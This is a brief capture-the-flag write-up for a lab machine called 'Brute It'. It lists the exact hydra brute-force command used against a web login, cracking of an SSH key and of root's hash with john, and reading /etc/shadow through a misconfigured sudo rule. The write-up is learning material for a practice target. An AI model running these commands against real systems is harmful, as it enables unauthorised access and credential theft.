# CTF Writeup: Brute It CTF

---

- Step 1: added <target_ip> to /etc/hosts and ran nmap scan --> 22 & 80 are open
- Step 2: ran gobuster to retrieve hidden dir on webserver --> retrieved /admin
- Step 3: tried brute-forcing with hydra
--> ran hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.246.174 http-post-form "/admin/:user=^USER^&pass=^PASS^&login=Login:Username or password invalid" 
- Step 4: retrieved private key from user "john"
- Step 5: made ssh2john id_rsa > hash and made john hash --wordlist=/usr/share/wordlists/rockyou.txt
- Step 6: retrieved passphrase "rockinroll" 
- Step 7: made chmod 600 id_rsa and made ssh -i id_rsa john@bruteit.thm and logged into ssh
- Step 8: retrieved user.txt flag
- Step 9: made sudo -l --> /bin/cat runnable without passwd as root
- Step 10: made sudo /bin/cat /root/root.txt --> retrieved root.txt
- Step 11: made sudo /bin/cat /etc/shadow --> gained password hash 
- Step 12: ran john password_hash and retrieved root password

---

## Key Learnings

- Slightly strengthened brute-forcing knowledge
- Slightly increased Linux Knowledge
- Slightly increased Hash Decoding Knowledge
